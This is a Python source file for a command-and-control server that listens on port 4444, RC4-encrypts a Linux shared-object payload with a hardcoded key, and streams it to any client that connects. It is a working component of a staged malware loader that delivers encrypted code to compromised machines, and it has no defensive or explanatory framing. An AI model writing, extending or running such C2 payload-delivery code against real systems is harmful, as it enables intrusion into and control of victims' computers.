# server.py

import socket
import struct
import os
import argparse

HOST = "0.0.0.0"
PORT = 4444
SO_PATH = "payload_linux.so"

PACKET_FORMAT = "<BHI 256s"

parser = argparse.ArgumentParser()
parser.add_argument('--ip', help='C2 IPv4 address', type=str, default=HOST)
parser.add_argument('-p', '--port', help='C2 port', type=int, default=PORT)
parser.add_argument('--payload', help='File path of the DLL payload', type=str, default=SO_PATH)

args = parser.parse_args()

def rc4_crypt(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    out_data = bytearray(data)
    for n in range(len(out_data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out_data[n] ^= S[(S[i] + S[j]) % 256]

    return bytes(out_data)

def verify_environment() -> bool:
    if not args.ip:
        print('[-] C2 IP is null or empty.')
        return False
    else:
        print(f'[*] IP => {args.ip}')

    if not args.port:
        print('[-] C2 port is null or empty.')
        return False
    else:
        print(f'[*] Port => {args.port}')

    if not args.payload or not os.path.exists(args.payload):
        print('[-] Payload file not found: ' + args.payload)
        return False
    else:
        print(f'[*] DLL payload => {args.payload}')

    return True

def recv_exact(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            raise ConnectionError("Connection closed prematurely")
        data.extend(packet)
    return bytes(data)

def main():

    if not verify_environment():
        print('[-] Environment error. Server is terminated.')
        return

    with open(args.payload, "rb") as f:
        dll_bytes = f.read()

    dll_bytes = rc4_crypt(b'RC4', dll_bytes)

    dll_len = len(dll_bytes)
    print(f"[*] Loaded payload_linux.so: {dll_len} bytes")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.ip, args.port))
        srv.listen(1)
        print(f"[*] Listening on {HOST}:{PORT}...")

        conn, addr = srv.accept()
        print(f"[+] Connection from {addr}")
        with conn:
            '''
            packet_size = struct.calcsize(PACKET_FORMAT)
            packed_data = recv_exact(conn, packet_size)

            unpacked_magic, unpacked_cmd, unpacked_len, unpacked_payload = struct.unpack(PACKET_FORMAT, packed_data)

            print(unpacked_cmd)
            '''

            conn.sendall(struct.pack("<I", dll_len))
            conn.sendall(dll_bytes)
            print(f"[+] Sent {dll_len} bytes")

if __name__ == "__main__":
    main()
